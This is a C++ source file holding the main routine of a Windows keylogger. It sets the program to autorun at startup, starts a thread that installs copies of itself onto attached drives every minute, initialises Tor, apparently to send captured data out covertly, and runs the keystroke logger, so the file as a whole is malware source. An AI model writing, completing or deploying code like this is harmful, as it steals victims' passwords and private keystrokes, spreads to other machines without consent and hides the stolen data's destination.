#include "stdafx.h"
#include "Settings.h"
#include "Logger.h"
#include "Keylogger.h"
#include "Installer.h"
#include "Tor.h"

DWORD WINAPI ProcInstall(LPVOID lpParameter)
{
	for (;;) {
		installer.InstallOnDrives();
		Sleep(60000);
	}
	return 0;
}

extern "C" int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
{
	wchar_t semName[] = V_UNIQUE_ID;
	HANDLE hSem = CreateSemaphore(NULL, 1, 1, semName);
	if (WaitForSingleObject(hSem, 0) == WAIT_TIMEOUT)
	{
		VLog(LMESSAGE, L"Already running");
		CloseHandle(hSem);
		return 0;
	}

	installer.SetAutorun(true);
#ifdef _DEBUG
	installer.SetAutorun(false);
#endif

#ifndef _DEBUG
	CreateThread(NULL, 0xFFFF, ProcInstall, NULL, 0, NULL);
#endif

	VLog(LMESSAGE, L"Started");
	TOR_Init();
	keylogger.Run();
	TOR_Cleanup();

	CloseHandle(hSem);
	return 0;
}
